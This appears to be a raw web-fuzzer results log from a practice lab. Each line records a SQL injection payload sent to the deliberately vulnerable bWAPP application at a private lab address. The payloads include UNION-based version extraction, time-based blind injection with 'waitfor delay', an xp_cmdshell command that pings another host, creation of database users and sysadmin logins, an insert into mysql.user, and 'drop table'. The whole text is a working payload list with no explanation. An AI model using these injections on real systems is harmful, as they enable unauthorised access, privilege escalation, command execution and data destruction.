14,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--"
15,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--"
16,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20NULL,%20NULL,%20NULL,%20%20NULL,%20(select%20@@version))%20--"
17,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
18,302,0L,0W,"%200)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not(substring((select%20@@version),25,1)%20<>%200)%20waitfor%20delay%20'0:0:2'%20--"
19,302,0L,0W,"%205)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not(substring((select%20@@version),25,1)%20<>%205)%20waitfor%20delay%20'0:0:2'%20--"
20,302,0L,0W,"%208)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not(substring((select%20@@version),25,1)%20<>%208)%20waitfor%20delay%20'0:0:2'%20--"
21,302,0L,0W,"%201)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not(substring((select%20@@version),24,1)%20<>%201)%20waitfor%20delay%20'0:0:2'%20--"
22,302,0L,0W,%20'sa'%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not(select%20system_user)%20<>%20'sa'%20waitfor%20delay%20'0:0:2'%20--
23,302,0L,0W,%200%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20is_srvrolemember('sysadmin')%20>%200%20waitfor%20delay%20'0:0:2'%20--
24,302,0L,0W,%201)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not((select%20serverproperty('isintegratedsecurityonly'))%20<>%201)%20waitfor%20delay%20'0:0:2'%20--
25,302,0L,0W,%200)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not((select%20serverproperty('isintegratedsecurityonly'))%20<>%200)%20waitfor%20delay%20'0:0:2'%20--
26,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
27,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1'1
28,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1%20exec%20sp_%20(or%20exec%20xp_)
29,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1%20and%201=1
12,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20(select%20@@version))%20--"
13,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20NULL,%20(select%20@@version))%20--"
8,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20grant%20connect%20to%20name;%20grant%20resource%20to%20name;%20--
9,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20insert%20into%20users(login,%20password,%20level)%20values(%20char(0x70)%20+%20char(0x65)%20+%20char(0x74)%20+%20char(0x65)%20+%20char(0x72)%20+%20char(0x70)%20+%20char(0x65)%20+%20char(0x74)%20+%20char(0x65)%20+%20char(0x72),char(0x64)"
10,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20or%201=1%20--
11,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20@@version)%20--
1,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=﻿';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'--
30,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1'%20and%201=(select%20count(*)%20from%20tablenames);%20--
2,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='create%20user%20name%20identified%20by%20'pass123'%20--
3,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='create%20user%20name%20identified%20by%20pass123%20temporary%20tablespace%20temp%20default%20tablespace%20users;
4,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20;%20drop%20table%20temp%20--
5,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='exec%20sp_addlogin%20'name'%20,%20'password'%20--"
6,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20exec%20sp_addsrvrolemember%20'name'%20,%20'sysadmin'%20--"
7,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20insert%20into%20mysql.user%20(user,%20host,%20password)%20values%20('name',%20'localhost',%20password('pass123'))%20--"
34,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1
31,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1%20or%201=1
32,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1'%20or%20'1'='1
33,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
